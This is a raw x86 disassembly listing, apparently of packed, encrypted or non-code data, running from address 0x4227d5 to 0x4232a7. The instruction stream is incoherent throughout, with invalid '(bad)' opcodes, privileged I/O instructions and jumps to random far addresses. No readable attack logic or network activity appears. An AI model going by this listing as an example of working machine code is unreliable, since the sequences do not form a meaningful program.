  4227d5:	and    esi,DWORD PTR [edi-0x5a436dec]
  4227db:	push   eax
  4227dc:	mov    edi,0x2a52e71a
  4227e1:	int3   
  4227e2:	or     BYTE PTR [ecx+0x3b],ch
  4227e5:	push   edx
  4227e6:	add    DWORD PTR [ebp+0xa332890],edi
  4227ec:	outs   dx,DWORD PTR ds:[esi]
  4227ed:	mov    ch,0x4
  4227ef:	je     0x4227d6
  4227f1:	clc    
  4227f2:	push   ecx
  4227f3:	pop    ds
  4227f4:	mov    DWORD PTR [ebx+eiz*2+0x9f2008e],eax
  4227fb:	fmul   QWORD PTR [eax-0x21]
  4227fe:	xor    al,0x11
  422801:	test   DWORD PTR [edi+0x2f],0xaa49a366
  422808:	xchg   ecx,eax
  422809:	and    eax,0x81901729
  42280e:	or     DWORD PTR [eax-0x6],0xfffffff9
  422812:	pop    edi
  422813:	and    ah,bh
  422815:	lea    esi,gs:[edx-0x5be31b83]
  42281c:	or     al,0x2d
  42281e:	pop    esi
  42281f:	adc    DWORD PTR [edx+eiz*2+0x326ddb5b],ebp
  422826:	lods   eax,DWORD PTR ds:[esi]
  422827:	mov    ds:0xf5d96e88,al
  42282c:	out    0x85,eax
  42282e:	fxch   st(1)
  422830:	jb     0x42287f
  422832:	pushf  
  422833:	xor    dl,BYTE PTR [esi+0xbec075c]
  422839:	jge    0x42288e
  42283b:	cdq    
  42283c:	dec    esp
  42283d:	daa    
  42283e:	jmp    0xdf4d39ed
  422843:	push   esp
  422844:	shr    BYTE PTR [esp+ebx*8+0x2dc839d4],cl
  42284b:	fisubr WORD PTR [ebx+0x12]
  42284e:	pushf  
  42284f:	stos   DWORD PTR es:[edi],eax
  422850:	sti    
  422851:	and    DWORD PTR ds:0x5f025ebf,esi
  422857:	xor    eax,0x1910d5ab
  42285c:	clc    
  42285d:	push   edi
  42285e:	jg     0x42283b
  422860:	ds jo  0x422827
  422863:	mov    dl,0xc7
  422865:	mov    WORD PTR [ebx-0x7b07a7f9],ss
  42286b:	dec    ebx
  42286c:	push   eax
  42286d:	xchg   ebp,eax
  42286e:	push   edx
  42286f:	mov    esi,0xa2e7b32f
  422874:	retf   0xa90c
  422877:	pop    es
  422878:	jecxz  0x422849
  42287a:	mov    dh,0x11
  42287c:	or     DWORD PTR [esi-0x7a824272],edi
  422882:	inc    ecx
  422883:	dec    esi
  422884:	jbe    0x422816
  422886:	sbb    ebx,ebx
  422888:	fisub  WORD PTR [ebp-0x44b9aef2]
  42288e:	(bad)  
  42288f:	mov    BYTE PTR [ebp+0x57],ch
  422892:	xchg   esp,eax
  422893:	scas   al,BYTE PTR es:[edi]
  422894:	pushf  
  422895:	(bad)  
  422896:	(bad)  
  422897:	jb     0x422878
  422899:	scas   al,BYTE PTR es:[edi]
  42289a:	call   0x50b77ed
  42289f:	das    
  4228a0:	loopne 0x422844
  4228a2:	es xor al,0xef
  4228a5:	mov    eax,ds:0x7224e986
  4228aa:	and    dh,BYTE PTR [ebp-0x10]
  4228ad:	pop    edi
  4228ae:	mov    edx,0x40f3a188
  4228b3:	pop    eax
  4228b4:	xchg   ecx,eax
  4228b5:	push   esp
  4228b6:	jb     0x42290c
  4228b8:	push   eax
  4228b9:	jmp    0x1895:0xab47e42d
  4228c0:	xchg   edx,eax
  4228c1:	xchg   ebp,eax
	...
  422932:	add    BYTE PTR [eax],al
  422934:	(bad)  
  422935:	cld    
  422936:	je     0x422955
  422938:	jbe    0x4228d7
  42293a:	(bad)  
  42293b:	jmp    ebx
  42293d:	lea    ecx,[ebx]
  42293f:	xchg   esp,eax
  422940:	loope  0x4228db
  422942:	sub    eax,0x171d8ea
  422947:	add    dh,dh
  422949:	add    BYTE PTR [eax],al
  42294b:	add    ah,dh
  42294d:	xor    al,BYTE PTR [ebp+0x2d]
  422950:	mov    al,ds:0x41c930cb
  422955:	mov    bh,0x98
  422957:	jle    0x42296f
  422959:	popf   
  42295a:	push   eax
  42295b:	jge    0x4228fa
  42295d:	mov    dl,0xfc
  42295f:	jmp    0x3c82:0xa5e01ff5
  422966:	jae    0x422995
  422968:	addr16 cmp ecx,esp
  42296b:	dec    edx
  42296c:	mov    edi,0xb8560f04
  422971:	push   edi
  422972:	xor    ebp,DWORD PTR [edx-0x79]
  422975:	and    dh,cl
  422977:	lods   eax,DWORD PTR ds:[esi]
  422978:	outs   dx,BYTE PTR ds:[esi]
  422979:	popa   
  42297a:	fdiv   QWORD PTR [ecx]
  42297c:	jl     0x42295f
  42297e:	xlat   BYTE PTR ds:[ebx]
  42297f:	cmp    eax,0xde11b011
  422984:	and    ch,BYTE PTR cs:[esi-0x4e]
  422988:	outs   dx,BYTE PTR ds:[esi]
  422989:	les    ebx,FWORD PTR [edi+ecx*4+0xf86a12]
  422990:	lsl    edi,WORD PTR ds:0x821338dc
  422997:	arpl   WORD PTR ds:0xdf071387,bp
  42299d:	popf   
  42299e:	retf   0x9bcd
  4229a1:	call   DWORD PTR [eax+0x6f]
  4229a4:	call   FWORD PTR [ebp+ebp*2+0x39]
  4229a8:	or     dh,BYTE PTR [edi+0x14]
  4229ab:	nop
  4229ac:	inc    eax
  4229ad:	mov    dl,0x5b
  4229af:	mov    bl,0x75
  4229b1:	ret    
  4229b2:	push   ds
  4229b3:	popa   
  4229b4:	jmp    0x29d36a24
  4229b9:	add    al,0xca
  4229bb:	popa   
  4229bc:	mov    esp,0x63d320cd
  4229c1:	adc    DWORD PTR [eax+eiz*2+0x76c5b37d],ebx
  4229c8:	stos   DWORD PTR es:[edi],eax
  4229c9:	and    al,0xc2
  4229cb:	fs mov al,0xcf
  4229ce:	adc    eax,0x45f7dac5
  4229d3:	and    eax,0xae6a4d21
  4229d8:	mov    edx,0xda19c01b
  4229dd:	add    al,BYTE PTR [esi-0x556ded71]
  4229e3:	cmp    edx,DWORD PTR [edi]
  4229e5:	repz or BYTE PTR ds:0xd9212995,ah
  4229ec:	or     ah,bh
  4229ee:	scas   eax,DWORD PTR es:[edi]
  4229ef:	(bad)  
  4229f0:	mov    esi,0xd4fb9a48
  4229f5:	cld    
  4229f6:	fs into 
  4229f8:	dec    ecx
  4229f9:	sbb    al,0x4
  4229fb:	pop    ebx
  4229fc:	inc    esp
  4229fd:	ret    0x7dbf
  422a00:	jb     0x422a29
  422a02:	dec    ebp
  422a03:	pusha  
  422a04:	or     eax,ecx
  422a06:	les    edi,FWORD PTR [edx+0xf]
  422a09:	popa   
  422a0a:	push   ebp
  422a0b:	clc    
  422a0c:	push   ds
  422a0d:	xor    BYTE PTR [ebp-0x19cd778d],dl
  422a13:	jno    0x422a53
  422a15:	ins    DWORD PTR es:[edi],dx
  422a16:	or     eax,0xa94dff88
  422a1b:	add    ebp,eax
  422a1d:	syscall 
  422a1f:	inc    esi
  422a20:	ror    BYTE PTR [ebp-0x7f0ba596],1
  422a26:	mov    ecx,0x9d02b8d1
  422a2b:	push   esi
  422a2c:	ret    0x20a4
  422a2f:	cs and esi,ebp
  422a32:	mov    edx,ecx
  422a34:	fistp  DWORD PTR [esi]
  422a36:	xor    DWORD PTR [ebx+0x52],esi
  422a39:	hlt    
  422a3a:	push   cs
  422a3b:	test   bl,cl
  422a3d:	pop    edx
  422a3e:	outs   dx,DWORD PTR ds:[esi]
  422a3f:	shr    BYTE PTR [edx+edi*1+0x0],1
	...
  422ab2:	add    BYTE PTR [eax],al
  422ab4:	push   ss
  422ab5:	cdq    
  422ab6:	jmp    0x37401a88
  422abb:	fcmovnbe st,st(0)
  422abd:	cld    
  422abe:	xor    al,0xd0
  422ac0:	aas    
  422ac1:	call   DWORD PTR [eax+eiz*4-0x32]
  422ac5:	jb     0x422ac8
  422ac7:	add    dh,dh
  422ac9:	add    BYTE PTR [eax],al
  422acb:	add    BYTE PTR [esi],ah
  422acd:	imul   edi,DWORD PTR [eax-0x25],0xdf0456aa
  422ad4:	out    dx,eax
  422ad5:	loope  0x422a66
  422ad7:	mov    dh,ah
  422ad9:	(bad)  
  422ada:	adc    BYTE PTR [ebx-0x1c],dl
  422add:	push   es
  422ade:	popf   
  422adf:	mov    ch,0x27
  422ae1:	js     0x422aa7
  422ae3:	gs mov dl,0xf4
  422ae6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422ae7:	inc    edi
  422ae8:	dec    edx
  422ae9:	sbb    edx,ebx
  422aeb:	ficom  DWORD PTR [edi+0x64]
  422aee:	jo     0x422b3a
  422af0:	fld    DWORD PTR [edi]
  422af2:	retf   0x9aba
  422af5:	push   edi
  422af6:	mov    eax,ds:0x7c905665
  422afb:	pop    ebx
  422afc:	mov    ah,0xe8
  422afe:	xchg   BYTE PTR [edi+0x7f],bl
  422b01:	jno    0x422b3a
  422b03:	mov    ch,BYTE PTR [eax+0x7db5be31]
  422b09:	mov    dl,0xf6
  422b0b:	in     al,dx
  422b0c:	xchg   edx,eax
  422b0d:	sahf   
  422b0e:	inc    ebp
  422b0f:	popf   
  422b10:	imul   ebp,DWORD PTR [ebx+0x2746999e],0x45a65c92
  422b1a:	add    eax,0x78179a82
  422b1f:	push   esi
  422b20:	(bad)  
  422b21:	mov    cs,ecx
  422b23:	mov    cl,0x36
  422b25:	jg     0x422b4c
  422b27:	mov    bh,0x7e
  422b29:	jecxz  0x422b88
  422b2b:	out    dx,al
  422b2c:	mov    ebp,edx
  422b2e:	xchg   BYTE PTR [esi],dl
  422b30:	xchg   ebx,eax
  422b31:	scas   al,BYTE PTR es:[edi]
  422b32:	cld    
  422b33:	shl    BYTE PTR [edi],0xf1
  422b36:	jmp    0x422b01
  422b38:	lock xor ch,BYTE PTR [esi-0x6d9eb4dd]
  422b3f:	inc    edx
  422b40:	mov    al,ds:0xa94fe13a
  422b45:	mov    bl,0x70
  422b47:	push   ebp
  422b48:	retf   0x4e72
  422b4b:	in     eax,dx
  422b4c:	sbb    DWORD PTR [edx],ebx
  422b4e:	jl     0x422b88
  422b50:	lds    ebx,FWORD PTR [ebp-0x39c6e7f6]
  422b56:	test   DWORD PTR [ebp-0x26739703],eax
  422b5c:	inc    ebx
  422b5d:	daa    
  422b5e:	xchg   ebp,eax
  422b5f:	icebp  
  422b60:	mov    ds:0xa138dc26,eax
  422b65:	sbb    BYTE PTR [ecx+0x1],dh
  422b68:	or     eax,ebp
  422b6a:	arpl   WORD PTR [ebx+eiz*2+0x4df6afce],cx
  422b71:	mov    edx,0xc14fdf18
  422b76:	inc    eax
  422b77:	ffreep st(2)
  422b79:	sbb    al,0x56
  422b7b:	dec    eax
  422b7c:	mov    esi,DWORD PTR ds:0x73d3ad42
  422b82:	push   ss
  422b83:	xor    dh,BYTE PTR [eax+0x37]
  422b86:	jmp    0xef3a:0x8af2b4aa
  422b8d:	jne    0x422bbc
  422b8f:	mov    ebp,0x426eb0e2
  422b94:	push   cs
  422b95:	mov    ecx,0x8cf460f3
  422b9a:	out    dx,eax
  422b9b:	(bad)  
  422b9d:	retf   0xee4c
  422ba0:	add    eax,0x6d8157c0
  422ba5:	stos   BYTE PTR es:[edi],al
  422ba6:	in     al,0x29
  422ba8:	pop    es
  422ba9:	nop
  422baa:	or     al,0xd9
  422bac:	inc    esi
  422bad:	xchg   esp,eax
  422bae:	add    bl,dh
  422bb0:	mov    eax,ds:0x54fa8db4
  422bb5:	push   edi
  422bb6:	xor    bh,BYTE PTR [ebx+eiz*4-0x5c]
  422bba:	add    BYTE PTR [esp+ecx*4-0x6b],bh
  422bbe:	adc    BYTE PTR [ebx-0x31],0xa1
	...
  422c32:	add    BYTE PTR [eax],al
  422c34:	mov    al,0x6b
  422c36:	mov    ch,0xe5
  422c38:	(bad)  
  422c39:	push   eax
  422c3b:	jg     0x422c9e
  422c3d:	pop    es
  422c3e:	jne    0x422bca
  422c40:	mov    al,ds:0xc444d4a3
  422c45:	jae    0x422c48
  422c47:	add    dh,dh
  422c49:	add    BYTE PTR [eax],al
  422c4b:	add    BYTE PTR [ebp+0x79],bh
  422c4e:	adc    bh,BYTE PTR [edi]
  422c50:	push   ecx
  422c51:	ret    
  422c52:	pop    ss
  422c53:	int3   
  422c54:	cmp    al,0xd6
  422c56:	xor    BYTE PTR [edx+edx*4],bh
  422c59:	pop    ebp
  422c5a:	nop
  422c5b:	jmp    0x5f49910d
  422c60:	push   0xf6e8a671
  422c65:	pop    esi
  422c66:	outs   dx,DWORD PTR ds:[esi]
  422c67:	mul    DWORD PTR [edi]
  422c69:	and    edi,edi
  422c6b:	fwait
  422c6c:	jl     0x422c49
  422c6e:	lods   al,BYTE PTR ds:[esi]
  422c6f:	(bad)  
  422c70:	and    eax,0xe823509a
  422c75:	lock ds pop edx
  422c78:	int3   
  422c79:	xor    ch,BYTE PTR [ebx-0x21]
  422c7c:	les    ebx,FWORD PTR [ecx+0x43]
  422c7f:	test   eax,0xe0660212
  422c84:	arpl   WORD PTR [ebx+0x65c3fc7d],cx
  422c8a:	cld    
  422c8b:	inc    ebx
  422c8c:	das    
  422c8d:	dec    eax
  422c8e:	(bad)
  422c91:	xchg   DWORD PTR es:[edi],esi
  422c94:	jae    0x422c16
  422c96:	add    BYTE PTR [esi],dl
  422c98:	mov    bl,0xb2
  422c9a:	fcom   DWORD PTR [ebx+0x2c]
  422c9d:	pusha  
  422c9e:	pop    edx
  422c9f:	aad    0xbd
  422ca1:	push   ds
  422ca2:	mov    ch,0xea
  422ca4:	pop    ebx
  422ca5:	es mov bl,0x84
  422ca8:	iret   
  422ca9:	push   ebp
  422caa:	gs inc ebx
  422cad:	test   eax,0x3cfc56e7
  422cb2:	cld    
  422cb3:	sbb    al,BYTE PTR es:[ebx]
  422cb6:	cmp    esp,esp
  422cb8:	daa    
  422cb9:	xor    edx,esp
  422cbb:	rcr    ah,0x6c
  422cbe:	imul   ecx,ecx,0x4aa9b223
  422cc4:	or     BYTE PTR ds:0x837470fb,bl
  422cca:	call   0x27690119
  422ccf:	cwde   
  422cd0:	mov    ds:0x734e2d8a,eax
  422cd5:	add    al,0x7b
  422cd7:	pop    ss
  422cd8:	lds    edi,FWORD PTR ds:0x463caa70
  422cde:	adc    bl,dh
  422ce0:	fcmovnbe st,st(2)
  422ce2:	lea    ebx,[ecx-0x4e]
  422ce5:	pushf  
  422ce6:	sub    eax,DWORD PTR [ecx-0x4ef438f2]
  422cec:	adc    al,0x79
  422cee:	mov    ah,0x38
  422cf0:	test   dh,bl
  422cf2:	fisub  DWORD PTR [edi+ecx*8]
  422cf5:	xchg   esi,eax
  422cf6:	mov    eax,0xbe5d4800
  422cfb:	sub    esp,esi
  422cfd:	jle    0x422cdf
  422cff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422d00:	mov    dh,ch
  422d02:	jg     0x422d78
  422d04:	cmp    eax,0x28f9b9c
  422d09:	xchg   ecx,eax
  422d0a:	jb     0x422ce1
  422d0c:	sbb    BYTE PTR [ebx-0x452a81d0],bl
  422d12:	cmp    BYTE PTR [ecx+0x60013ecd],ah
  422d18:	or     BYTE PTR [ecx-0x9],bl
  422d1b:	xchg   DWORD PTR [edx+0x68],ebx
  422d1e:	fld    QWORD PTR [ebx+0x5e1c4e97]
  422d24:	hlt    
  422d25:	inc    edx
  422d26:	jb     0x422cb7
  422d28:	nop
  422d29:	xor    ch,BYTE PTR [ebx-0x2284a38b]
  422d2f:	jb     0x422cb7
  422d31:	test   eax,0xdb320682
  422d36:	push   esi
  422d37:	(bad)  
  422d38:	jl     0x422d40
  422d3a:	ins    BYTE PTR es:[edi],dx
  422d3b:	bound  edi,QWORD PTR [ebp-0x5e]
  422d3e:	add    ebp,ecx
  422d40:	mov    esp,0xc1
	...
  422db1:	add    BYTE PTR [eax],al
  422db3:	add    bh,cl
  422db5:	mov    eax,ds:0xbf7f851b
  422dba:	fucomip st,st(3)
  422dbc:	addr16 mov ecx,0x5f41f9f7
  422dc2:	jmp    0x422daa
  422dc4:	mov    edx,0xf6000174
  422dc9:	add    BYTE PTR [eax],al
  422dcb:	add    BYTE PTR [ecx+0x1642bcc3],bh
  422dd1:	scas   al,BYTE PTR es:[edi]
  422dd2:	push   cs
  422dd3:	lock jg 0x422e09
  422dd6:	xchg   edx,eax
  422dd7:	dec    eax
  422dd8:	aaa    
  422dd9:	repnz pop esp
  422ddb:	mov    esi,0x97991be0
  422de0:	(bad)  
  422de1:	fmul   st(5),st
  422de3:	sub    ch,al
  422de5:	mov    es,WORD PTR [ecx-0x39]
  422de8:	sbb    BYTE PTR [esi],0x11
  422deb:	sub    DWORD PTR [esi],ebx
  422ded:	jl     0x422e23
  422def:	push   edx
  422df0:	push   eax
  422df1:	jmp    0xad3f:0x5cc23c19
  422df8:	and    BYTE PTR [edx],al
  422dfa:	in     eax,0xe8
  422dfc:	add    bh,BYTE PTR [esp+edi*2]
  422dff:	xor    dh,ch
  422e01:	out    dx,eax
  422e02:	push   cs
  422e03:	leave  
  422e04:	mov    WORD PTR [edx+eax*8-0x3d038237],es
  422e0b:	mov    ebx,edx
  422e0d:	pop    ds
  422e0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422e0f:	aas    
  422e10:	add    esi,DWORD PTR [ebp+0x72]
  422e13:	cmp    al,0x99
  422e15:	push   ss
  422e16:	in     al,0xa9
  422e18:	lar    esi,bx
  422e1b:	mov    al,ds:0x76b44871
  422e20:	repnz dec ebp
  422e22:	std    
  422e23:	fwait
  422e24:	push   ecx
  422e25:	into   
  422e26:	push   ebx
  422e27:	jmp    0x422e0c
  422e29:	fwait
  422e2a:	addr16 ret 
  422e2c:	bound  edi,QWORD PTR [eax]
  422e2e:	(bad)  
  422e2f:	jmp    DWORD PTR [ecx-0x30889f51]
  422e35:	std    
  422e36:	stc    
  422e37:	loopne 0x422e34
  422e39:	mov    ecx,0xa428163f
  422e3e:	jl     0x422eaa
  422e40:	pop    ecx
  422e41:	xor    bh,cl
  422e43:	mov    eax,ds:0x212ae9eb
  422e48:	imul   esp,DWORD PTR [ebx+0x17f95033],0xd53e4b13
  422e52:	fistp  QWORD PTR [esi-0x68d356c8]
  422e58:	xchg   edx,eax
  422e59:	push   esp
  422e5a:	cmp    al,al
  422e5c:	jmp    0x23b367c5
  422e61:	aas    
  422e62:	mov    DWORD PTR [ebx],esp
  422e64:	mov    ebx,0x2eb4b3d4
  422e69:	ins    DWORD PTR es:[edi],dx
  422e6a:	adc    BYTE PTR [esi-0x22dadd05],0xb4
  422e71:	jp     0x422edd
  422e73:	imul   esi,DWORD PTR [ebx-0x635f6882],0xf953c548
  422e7d:	daa    
  422e7e:	fldcw  WORD PTR [edx-0x6d]
  422e81:	enter  0x39c2,0xfe
  422e85:	adc    ebp,edi
  422e87:	int3   
  422e88:	xchg   ebx,eax
  422e89:	fst    QWORD PTR ds:0xdbff2629
  422e8f:	push   ebx
  422e90:	imul   ebp,DWORD PTR [esi+edx*2],0xb
  422e94:	repnz mov esp,0xfc8ad269
  422e9a:	or     al,0x97
  422e9c:	(bad)  
  422e9d:	and    BYTE PTR ss:[edi+0x3e],0xb5
  422ea2:	int    0x9e
  422ea4:	pop    esp
  422ea5:	xchg   ebp,eax
  422ea6:	lock mov bl,0x99
  422ea9:	or     ecx,DWORD PTR [ebx-0x2159ee55]
  422eaf:	clc    
  422eb0:	outs   dx,BYTE PTR ds:[esi]
  422eb1:	cmp    DWORD PTR [esi+edi*8-0x6b5f0b3d],0x5aacac26
  422ebc:	cmp    DWORD PTR [ecx+ebx*1+0x44],ebx
  422ec0:	cwde   
  422ec1:	loopne 0x422ec3
	...
  422f33:	add    BYTE PTR [ebx+0x6],ch
  422f36:	(bad)  
  422f37:	dec    edi
  422f38:	out    dx,eax
  422f39:	iret   
  422f3a:	jmp    0x422f62
  422f3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422f3d:	addr16 fs add al,ah
  422f41:	sbb    eax,ecx
  422f43:	dec    edi
  422f44:	mov    al,0x75
  422f46:	add    DWORD PTR [eax],eax
  422f48:	test   BYTE PTR [eax],0x0
  422f4b:	add    BYTE PTR [ebp+0x2ac03690],ah
  422f51:	(bad)  
  422f53:	adc    eax,0x2892b818
  422f58:	sti    
  422f59:	in     al,0xe1
  422f5b:	jmp    0xfd98d2dc
  422f60:	pop    edi
  422f61:	mov    WORD PTR [edi],cs
  422f63:	pushf  
  422f64:	adc    DWORD PTR [edx],ebx
  422f66:	adc    ecx,DWORD PTR [edi]
  422f68:	push   esp
  422f69:	sahf   
  422f6a:	test   BYTE PTR [ebx],ch
  422f6c:	mov    BYTE PTR [ecx+0x771a26c],ch
  422f72:	adc    ch,BYTE PTR [ebx-0x54e2cd2b]
  422f78:	fnstsw WORD PTR [ecx+0x20]
  422f7b:	push   ds
  422f7c:	and    BYTE PTR [ebp+0x62],0x65
  422f80:	lods   al,BYTE PTR ds:[esi]
  422f81:	call   0xd05cf93a
  422f86:	sbb    eax,0x473fcedf
  422f8b:	(bad)  
  422f8c:	popf   
  422f8d:	dec    esi
  422f8e:	loopne 0x422f93
  422f90:	pop    esp
  422f91:	cwde   
  422f92:	mov    ebp,0x3b128318
  422f97:	out    dx,eax
  422f98:	idiv   DWORD PTR [ebx+0x5f]
  422f9b:	shr    BYTE PTR [ebx-0x3a],0x37
  422f9f:	mov    ds:0x82f35a92,eax
  422fa4:	lods   eax,DWORD PTR ds:[esi]
  422fa5:	mov    es,WORD PTR [ebp-0x599ae00f]
  422fab:	sub    DWORD PTR [eax-0x16a27f7b],ebx
  422fb1:	out    dx,eax
  422fb2:	(bad)  
  422fb3:	jmp    0x11f47db1
  422fb8:	nop
  422fb9:	push   es
  422fba:	loopne 0x422fff
  422fbc:	mov    DWORD PTR [ecx+0x13],ebx
  422fbf:	aas    
  422fc0:	mov    bh,0xc1
  422fc2:	jb     0x422f91
  422fc4:	or     DWORD PTR [edi+eiz*1+0x52],ebx
  422fc8:	inc    ebp
  422fc9:	mov    bl,BYTE PTR [eax-0x62cc07b9]
  422fcf:	(bad)  
  422fd0:	inc    edx
  422fd1:	fwait
  422fd2:	mov    ah,0xfd
  422fd4:	in     al,dx
  422fd5:	sub    eax,edx
  422fd7:	mov    DWORD PTR [edi],ebx
  422fd9:	mov    edx,0x84127351
  422fde:	or     cl,dh
  422fe0:	push   ebx
  422fe1:	shr    DWORD PTR [eax-0x38],1
  422fe4:	jge    0x422f73
  422fe6:	(bad)  
  422fe7:	mov    al,ds:0xe9c22504
  422fec:	mov    ebx,ebx
  422fee:	adc    eax,0xa7159027
  422ff3:	popa   
  422ff4:	mov    esp,0xff738ef9
  422ff9:	in     al,dx
  422ffa:	mov    ebp,0x8ab6ea9b
  422fff:	mov    ebp,0xefa88420
  423004:	int    0xba
  423006:	popf   
  423007:	data16 or al,0xda
  42300a:	repnz sub eax,DWORD PTR [edi+0x3a183b8]
  423011:	bound  esp,QWORD PTR [esi+0x71]
  423014:	popf   
  423015:	or     al,BYTE PTR [ebx-0x1ebdf869]
  42301b:	das    
  42301c:	xchg   esi,eax
  42301d:	inc    ebp
  42301e:	in     eax,0xf3
  423020:	scas   al,BYTE PTR es:[edi]
  423021:	iret   
  423022:	pushf  
  423023:	jecxz  0x42309a
  423025:	jp     0x422fed
  423027:	xor    BYTE PTR [ecx],0x9f
  42302a:	inc    esp
  42302b:	std    
  42302c:	cmp    BYTE PTR [bx+0x2b20],0xc0
  423032:	xchg   ebp,eax
  423033:	pop    ecx
  423034:	fcmovb st,st(2)
  423036:	outs   dx,DWORD PTR ds:[esi]
  423037:	sub    DWORD PTR [eax],esi
  423039:	sbb    dh,bl
  42303b:	or     eax,0x99c24798
  423040:	int3   
  423041:	test   eax,0x0
	...
  4230b2:	add    BYTE PTR [eax],al
  4230b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4230b5:	push   edx
  4230b6:	jnp    0x4230b5
  4230b8:	(bad)  
  4230b9:	std    
  4230ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4230bb:	pop    ebx
  4230bc:	lods   eax,DWORD PTR ds:[esi]
  4230bd:	jne    0x423121
  4230bf:	xchg   ecx,eax
  4230c0:	inc    esp
  4230c1:	iret   
  4230c2:	dec    esp
  4230c3:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4230c5:	jbe    0x4230c8
  4230c7:	add    dh,dh
  4230c9:	add    BYTE PTR [eax],al
  4230cb:	add    BYTE PTR [ecx+ecx*4],bl
  4230ce:	repnz mov esp,0x6b66e2c6
  4230d4:	pop    ebp
  4230d5:	push   edx
  4230d6:	adc    eax,0x1ce8d998
  4230db:	cmp    bh,0xe4
  4230de:	mov    ?,WORD PTR [ebx-0xa5071a6]
  4230e4:	sar    BYTE PTR [ecx],cl
  4230e6:	xor    al,0x3e
  4230e8:	jl     0x423086
  4230ea:	adc    ebp,DWORD PTR [esi]
  4230ec:	mov    fs,esi
  4230ee:	mov    DWORD PTR [edi-0x19],esp
  4230f1:	sub    al,0xa7
  4230f3:	sti    
  4230f4:	mov    esi,0xaefab092
  4230f9:	adc    eax,0xc0d631c
  4230fe:	loope  0x423141
  423100:	hlt    
  423101:	mov    ch,0xce
  423103:	mov    al,0xfc
  423105:	inc    ecx
  423106:	pop    edx
  423107:	repnz (bad) 
  423109:	aaa    
  42310a:	stos   BYTE PTR es:[edi],al
  42310b:	bound  edx,QWORD PTR [ecx+0x1a]
  42310e:	lods   eax,DWORD PTR ds:[esi]
  42310f:	repz push ebx
  423111:	cmp    al,0x21
  423113:	jp     0x423124
  423115:	jp     0x423127
  423117:	arpl   WORD PTR [ebx-0x1],bp
  42311a:	inc    edx
  42311b:	or     ah,ah
  42311d:	ficom  DWORD PTR [eax]
  42311f:	frstor gs:[eax-0x31b04fcc]
  423126:	xchg   ebx,eax
  423127:	imul   esp,DWORD PTR [eax+edx*8-0x17],0x41
  42312c:	jl     0x4230b4
  42312e:	stc    
  42312f:	ret    
  423130:	mov    ecx,0xc4e73b4b
  423135:	dec    esp
  423136:	pop    ss
  423137:	pop    ebx
  423138:	mov    ds:0x2bae310d,eax
  42313d:	stos   DWORD PTR es:[edi],eax
  42313e:	mov    WORD PTR [esi+0x2612ecfc],?
  423144:	or     bh,BYTE PTR [esi]
  423146:	fmul   QWORD PTR [ebp-0x6b4dff23]
  42314c:	jns    0x42313f
  42314e:	dec    eax
  42314f:	inc    bh
  423151:	leave  
  423152:	mov    al,0xa1
  423154:	xor    al,0x85
  423156:	jp     0x423191
  423158:	je     0x423199
  42315a:	sbb    bh,BYTE PTR [esi]
  42315c:	cmp    BYTE PTR ds:0xaf133dd,bl
  423162:	dec    edx
  423163:	push   esp
  423164:	xor    al,0x98
  423166:	in     eax,dx
  423167:	into   
  423168:	add    al,0xe2
  42316a:	xchg   ebx,eax
  42316b:	jg     0x423136
  42316d:	lods   al,BYTE PTR ds:[esi]
  42316e:	outs   dx,BYTE PTR ds:[esi]
  42316f:	(bad)  
  423170:	adc    DWORD PTR [ebx+0x4ada8d0f],ecx
  423176:	jmp    0x423102
  423178:	(bad)  
  423179:	imul   esi,DWORD PTR [edx+0x239a7a92],0x23
  423180:	mov    ch,0xb1
  423182:	sahf   
  423183:	ret    
  423184:	mov    edi,0x6ae31e1f
  423189:	popa   
  42318a:	inc    edx
  42318b:	mov    cl,BYTE PTR [edx+esi*1]
  42318e:	int3   
  42318f:	mov    ah,0x33
  423191:	mov    WORD PTR [eax+0x3ca12532],gs
  423197:	mov    ?,WORD PTR [eax-0x6]
  42319a:	sub    BYTE PTR [ebx-0x4a8e7a69],dh
  4231a0:	mov    bl,BYTE PTR [eax-0x4f6097e5]
  4231a6:	lods   eax,DWORD PTR ds:[esi]
  4231a7:	test   DWORD PTR [edi-0x12d4defe],edi
  4231ad:	sbb    ch,dl
  4231af:	imul   esi,DWORD PTR [edi],0xb3c6ad03
  4231b5:	imul   esp,DWORD PTR [ebp+ebp*4+0x57],0x98a1c05b
  4231bd:	imul   edx,DWORD PTR [ecx],0xffffff9a
  4231c0:	or     eax,DWORD PTR [esi+0x0]
	...
  423232:	add    BYTE PTR [eax],al
  423234:	(bad)  
  423235:	in     eax,dx
  423236:	lods   eax,DWORD PTR ds:[esi]
  423237:	imul   edi
  423239:	neg    edi
  42323b:	std    
  42323c:	stc    
  42323d:	idiv   DWORD PTR ds:0x4936b4b0
  423243:	pop    ds
  423244:	pushf  
  423245:	ja     0x423248
  423247:	add    dh,dh
  423249:	add    BYTE PTR [eax],al
  42324b:	add    BYTE PTR [edx],ch
  42324d:	cs inc edx
  423250:	mov    esp,0x65a6e88
  423255:	cmp    DWORD PTR [edi+0x743737a],edi
  42325b:	adc    esp,DWORD PTR [edx+0x24f67d6f]
  423261:	popf   
  423262:	mov    edi,0x6dadb6bb
  423267:	sub    BYTE PTR [ebp+0x53],bl
  42326a:	or     eax,0x228dcf1c
  42326f:	fsubp  st(5),st
  423271:	push   ecx
  423272:	fdivr  DWORD PTR [esp+edi*2]
  423275:	jmp    0x42323d
  423277:	push   ds
  423278:	imul   eax,edx,0xd7ca02cc
  42327e:	shl    BYTE PTR [eax+edi*4],1
  423281:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423282:	out    0x75,al
  423284:	pop    edx
  423285:	xchg   esp,eax
  423286:	gs ins DWORD PTR es:[edi],dx
  423288:	bound  edi,QWORD PTR [ecx-0x70]
  42328b:	pop    ds
  42328c:	xor    al,0xb1
  42328e:	repnz mul BYTE PTR [edi]
  423291:	fst    st(6)
  423293:	pop    ebx
  423294:	dec    edx
  423295:	jno    0x4232d3
  423297:	daa    
  423298:	in     eax,dx
  423299:	ret    0x4be2
  42329c:	mov    WORD PTR [edi],cs
  42329e:	cmp    bh,BYTE PTR [edi-0x22]
  4232a1:	add    bl,BYTE PTR [ebx+0x1]
  4232a4:	jp     0x4232fd
  4232a6:	aas    
  4232a7:	daa    
